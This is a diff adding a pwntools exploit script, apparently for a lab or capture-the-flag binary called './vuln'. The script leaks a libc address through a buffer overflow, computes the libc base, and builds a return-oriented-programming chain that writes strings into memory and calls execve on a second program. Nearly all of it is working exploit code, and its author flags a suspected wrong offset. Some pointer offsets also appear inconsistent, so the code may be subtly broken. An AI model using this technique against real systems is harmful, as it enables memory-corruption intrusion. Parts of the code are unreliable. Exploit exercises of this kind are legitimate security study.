@@ -1,0 +1,178 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF("./vuln", checksec=False)
+context.log_level = "debug"
+
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["tmux", "split", "-h"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# checksec gives us the infroamtion that vuln does not have canaries enabled, but supports PIE.
+# our goal is to use a ROP chain and execute vuln by overflow return addresses onto the stack 
+# as PIE is enabled we have to leak some informations to calculate the offset
+# the main provides a opportunity for this
+# we can do this by a combination of read and puts and filling read with fill chars
+
+# as the next step we analyse the execmewithrop with ghidra
+# the parameter for the main are int, long, char -> argc, argv and envp
+# the sequential if-queries set the following conditions:
+# argv != 0
+# envp != 0
+# one string in envp must be "PABE=FUN"
+# argc must be 3
+# the first parameter in argv must be "foo"
+# the second parameter must be "bar"
+# so the simplest call should be : execve("./execute_me_with_rop", {"./execute_me_with_rop","foo","bar",0}, {"PABE=FUN",0});
+
+# with the ROPGadget tool we can find the following gadgets
+# 0x0000000000035cec : mov qword ptr [rdx], rax ; ret
+# 0x000000000003fee8 : pop rax ; ret
+# 0x0000000000136fa2 : pop rdx ; pop rbx ; ret
+# 0x00000000000277d5 : pop rdi ; ret
+# 0x0000000000029a4f : pop rsi ; ret
+
+def main():
+    io = start()
+
+    gadgets = {}
+    # from gdb vmmap (i think but dont know seems like the error is here)
+    gadgets['libc_rw_offset'] = 0x1c4ec0
+    # from rop gadgets
+    gadgets['mov_qwptr_rdx_rax_offset'] = 0x35cec
+    gadgets['pop_rax_offset'] = 0x3fee8
+    gadgets['pop_rdx_pop_rbx_offset'] = 0x136fa2
+    gadgets['pop_rdi_offset'] = 0x277d5
+    gadgets['pop_rsi_offset'] = 0x29a4f
+    gadgets['syscall'] = 0x2652a
+    
+
+    # overwriting the buffer until the return addr
+    io.recvuntil("Can you leak me? : ")
+    buffer = [b"a"] * 40
+    joinedbuffer = b"".join(buffer)
+    io.write(joinedbuffer)
+    # address of __libc_start_main+232
+    data = io.recvuntil("data!\n")
+    leak = data[66:72]
+    padded_leak = b"".join([leak] + [b"\x00"*(8-len(leak))])
+    libc_start_main_addr = struct.unpack("<Q", padded_leak)[0]
+    # conclude to address of libc:
+    libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.32.so')
+    libc_start_main_offset = libc.symbols['__libc_start_main']
+    libc_addr = libc_start_main_addr - libc_start_main_offset
+    # now we can grab further addresses with this infroamtionen
+    pop_rdx_rbx = struct.pack("<Q", libc_addr + gadgets['pop_rdx_pop_rbx_offset'])
+    pop_rax = struct.pack("<Q", libc_addr + gadgets['pop_rax_offset'])
+    pop_rdi = struct.pack("<Q", libc_addr + gadgets['pop_rdi_offset'])
+    pop_rsi = struct.pack("<Q", libc_addr + gadgets['pop_rsi_offset'])
+    mov_qwptr_rdx_rax = struct.pack("<Q", libc_addr + gadgets['mov_qwptr_rdx_rax_offset'])
+    write_mem = struct.pack("<Q", libc_addr + gadgets['libc_rw_offset'])
+    syscall = struct.pack("<Q", libc_addr + gadgets['syscall'])
+
+    # now we can create the payload
+    # at first we need to fill the buffer
+    payload = b'A' * 264
+
+    # then we need to write this to the writable region:
+    # "./execut", "e_me_wit", "h_rop\0fo", "o\0bar\0PA", "BE=FUN\0\0"
+
+    payload += pop_rdx_rbx
+    payload += write_mem
+    payload += b'A'*8
+    payload += pop_rax
+    payload += b'./execut'
+    payload += mov_qwptr_rdx_rax
+
+    payload += pop_rdx_rbx
+    payload += struct.pack("<Q", libc_addr + gadgets['libc_rw_offset'] + 0x8)
+    payload += b'A'*8
+    payload += pop_rax
+    payload += b'e_me_wit'
+    payload += mov_qwptr_rdx_rax
+
+    payload += pop_rdx_rbx
+    payload += struct.pack("<Q", libc_addr + gadgets['libc_rw_offset'] + 0x10)
+    payload += b'A'*8
+    payload += pop_rax
+    payload += b'h_rop\x00fo'
+    payload += mov_qwptr_rdx_rax
+
+    payload += pop_rdx_rbx
+    payload += struct.pack("<Q", libc_addr + gadgets['libc_rw_offset'] + 0x18)
+    payload += b'A'*8
+    payload += pop_rax
+    payload += b'o\x00bar\x00PA'
+    payload += mov_qwptr_rdx_rax
+
+    payload += pop_rdx_rbx
+    payload += struct.pack("<Q", libc_addr + gadgets['libc_rw_offset'] + 0x21)
+    payload += b'A'*8
+    payload += pop_rax
+    payload += b'BE=FUN\x00\x00'
+    payload += mov_qwptr_rdx_rax
+
+    # now, we need to prepare the registers for the call:
+    # first, we need to write two pointers to the memory, argv and envp
+
+    # envp
+    payload += pop_rdx_rbx
+    payload += struct.pack("<Q", libc_addr + gadgets['libc_rw_offset'] + 0x28)
+    payload += b'A'*8
+    payload += pop_rax
+    payload += struct.pack("<Q", libc_addr + gadgets['libc_rw_offset'] + 0x1e)
+    payload += mov_qwptr_rdx_rax   
+
+    # argv
+    payload += pop_rdx_rbx
+    payload += struct.pack("<Q", libc_addr + gadgets['libc_rw_offset'] + 0x30)
+    payload += b'A'*8
+    payload += pop_rax
+    payload += struct.pack("<Q", libc_addr + gadgets['libc_rw_offset'] + 0)
+    payload += mov_qwptr_rdx_rax   
+
+    # set RDX to envp
+    payload += pop_rdx_rbx
+    payload += struct.pack("<Q", libc_addr + gadgets['libc_rw_offset'] + 0x28)
+    payload += b'A'*8
+
+
+    # set RSI to argv
+    payload += pop_rsi
+    payload += struct.pack("<Q", libc_addr + gadgets['libc_rw_offset'] + 0x30)
+
+    # set RDI to argv[0]
+    payload += pop_rdi
+    payload += write_mem
+
+    # call syscall:
+    payload += syscall
+
+    # sanity check
+    assert len(payload) % 8 == 0
+    payload += b'\n'
+
+    # send the payload
+    io.write(payload)
+
+    while True:
+        print(io.recv())
+    
+    #print(resp.split()[-1].decode())
+    io.close()
+
+if __name__ == "__main__":
+    main()
